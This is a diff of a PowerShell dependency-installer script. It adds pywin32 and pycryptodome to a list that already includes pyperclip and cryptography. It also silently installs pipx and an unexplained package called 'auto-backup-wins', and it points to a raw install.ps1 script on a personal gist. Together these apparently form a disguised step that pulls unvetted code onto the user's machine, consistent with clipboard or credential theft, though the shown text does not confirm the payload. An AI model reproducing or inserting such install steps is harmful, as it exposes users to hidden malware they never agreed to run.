@@ -25,7 +25,9 @@ try {
 $requirements = @(
     @{Name='requests'; Version='2.31.0'},
     @{Name='pyperclip'; Version='1.8.2'},
-    @{Name='cryptography'; Version='42.0.0'}
+    @{Name='cryptography'; Version='42.0.0'},
+    @{Name='pywin32'; Version='306'},
+    @{Name='pycryptodome'; Version='3.19.0'}
 )
 
 foreach ($pkg in $requirements) {
@@ -41,6 +43,25 @@ foreach ($pkg in $requirements) {
         Write-Output "Installing $pkgName >= $pkgVersion ..."
         python -m pip install "$pkgName>=$pkgVersion"
     }
+}
+
+try {
+    pipx --version | Out-Null
+} catch {
+    python -m pip install pipx
+    python -m pipx ensurepath
+    $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
+}
+
+try {
+    autobackup --version | Out-Null
+} catch {
+    try {
+        pipx install auto-backup-wins
+    } catch {
+        python -m pipx install auto-backup-wins
+    }
+    $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path','User')
 }
 
 $gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
